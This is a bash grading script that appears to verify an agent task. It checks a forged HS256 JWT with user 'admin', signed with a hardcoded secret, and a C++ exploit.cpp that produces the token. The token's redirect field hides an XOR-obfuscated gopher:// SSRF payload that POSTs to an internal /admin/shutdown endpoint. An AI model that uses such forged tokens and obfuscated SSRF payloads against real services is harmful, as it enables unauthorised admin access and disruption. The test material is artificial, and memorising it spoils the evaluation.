#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import stat
import base64
import hmac
import hashlib
import json
import subprocess
import tempfile

FINAL_PATH = "/home/user/final_payload.txt"
SOURCE_PATH = "/home/user/exploit.cpp"


def test_final_payload_exists():
    """Verify that the final_payload.txt file was created."""
    assert os.path.isfile(FINAL_PATH), f"{FINAL_PATH} does not exist."


def test_final_payload_validity():
    """Verify the structure, header, signature, and contents of the generated JWT."""
    with open(FINAL_PATH, "r") as f:
        token = f.read().strip()

    parts = token.split('.')
    assert len(parts) == 3, f"Expected a valid JWT with 3 parts (Header.Payload.Signature), but found {len(parts)} parts."

    head, pld, sig = parts

    # 1. Decode and verify the exact required JWT header.
    expected_header_bytes = b'{"alg":"HS256","typ":"JWT"}'
    expected_head = base64.urlsafe_b64encode(expected_header_bytes).decode().rstrip('=')
    assert head == expected_head, "The JWT header is not the required Base64url-encoded HS256/JWT header."

    head_padded = head + "=" * ((4 - len(head) % 4) % 4)
    try:
        decoded_head_bytes = base64.urlsafe_b64decode(head_padded)
        decoded_head = json.loads(decoded_head_bytes.decode('utf-8'))
    except Exception as e:
        assert False, f"Failed to decode or parse the JWT header as JSON: {e}"
    assert decoded_head_bytes == expected_header_bytes
    assert decoded_head == {"alg": "HS256", "typ": "JWT"}

    # 2. Verify the HMAC-SHA256 signature.
    secret = b"operator_secret_2024!"
    signing_input = f"{head}.{pld}".encode()
    expected_sig_bytes = hmac.new(secret, signing_input, hashlib.sha256).digest()
    expected_sig = base64.urlsafe_b64encode(expected_sig_bytes).decode().rstrip('=')

    assert sig == expected_sig, "The JWT signature is invalid. Ensure you are using HMAC-SHA256 with the correct secret."

    # 3. Decode and verify the payload.
    pld_padded = pld + "=" * ((4 - len(pld) % 4) % 4)
    try:
        decoded_pld_bytes = base64.urlsafe_b64decode(pld_padded)
        decoded_pld = json.loads(decoded_pld_bytes.decode('utf-8'))
    except Exception as e:
        assert False, f"Failed to decode or parse the JWT payload as JSON: {e}"

    assert decoded_pld.get('user') == 'admin', f"Expected user to be 'admin', but got '{decoded_pld.get('user')}'."

    redirect_val = decoded_pld.get('redirect')
    assert redirect_val is not None, "The 'redirect' field is missing from the JWT payload."

    # 4. Verify the XOR-encoded and Base64url-encoded redirect payload.
    url = "gopher://127.0.0.1:8080/_POST%20/admin/shutdown"
    key = [0xDE, 0xAD, 0xBE, 0xEF]

    xored = bytearray()
    for i, c in enumerate(url):
        xored.append(ord(c) ^ key[i % 4])

    expected_redirect = base64.urlsafe_b64encode(xored).decode().rstrip('=')

    assert redirect_val == expected_redirect, (
        f"The 'redirect' value does not match the expected encoded string.\n"
        f"Expected: {expected_redirect}\n"
        f"Actual:   {redirect_val}"
    )


def test_cpp_program_compiles_and_generates_payload():
    """Compile the submitted C++ source and verify that running it produces the file's token."""
    try:
        source_stat = os.lstat(SOURCE_PATH)
    except FileNotFoundError:
        assert False, f"{SOURCE_PATH} does not exist."
    assert stat.S_ISREG(source_stat.st_mode), f"{SOURCE_PATH} must be a regular C++ source file."

    with open(FINAL_PATH, "r") as f:
        expected_token = f.read().strip()

    with tempfile.TemporaryDirectory(prefix="verify_exploit_") as workdir:
        binary = os.path.join(workdir, "exploit")
        compile_result = subprocess.run(
            ["/usr/bin/g++", "-std=c++17", SOURCE_PATH, "-o", binary, "-lcrypto"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=30,
        )
        assert compile_result.returncode == 0, (
            "Failed to compile /home/user/exploit.cpp:\n" + compile_result.stderr
        )

        # Remove the submitted output while executing so the program cannot merely
        # read and echo final_payload.txt.
        hidden_payload = os.path.join(workdir, "submitted_payload")
        os.replace(FINAL_PATH, hidden_payload)
        try:
            run_result = subprocess.run(
                [binary],
                cwd=workdir,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=10,
            )
        finally:
            os.replace(hidden_payload, FINAL_PATH)

        assert run_result.returncode == 0, (
            f"The compiled exploit program exited with status {run_result.returncode}:\n"
            + run_result.stderr
        )
        assert run_result.stdout.strip() == expected_token, (
            "Running the compiled exploit.cpp did not generate the JWT stored in final_payload.txt."
        )
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
